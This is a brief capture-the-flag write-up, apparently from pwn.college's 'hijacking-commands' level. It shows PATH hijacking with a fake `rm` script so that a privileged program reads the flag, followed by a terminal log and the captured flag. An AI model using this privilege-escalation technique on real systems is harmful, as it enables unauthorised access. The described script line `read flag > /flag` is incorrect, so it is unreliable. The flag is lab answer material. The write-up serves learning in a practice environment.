# Hijacking Commands
Using the `nano` command I created a shell script called `rm` and inside that script I wrote commands like `read flag > /flag` and `echo $flag`. Then I updated the path so that when the `/challenge/run` command runs and looks for `rm` it will find this script and execute it to read the flag.
```bash
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod u+x rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{MhggM8QXOSC-AtkcetRaPWwdw8_.ddzNyUDL2AjN0czW}
```
Resource used was the pwn webiste.
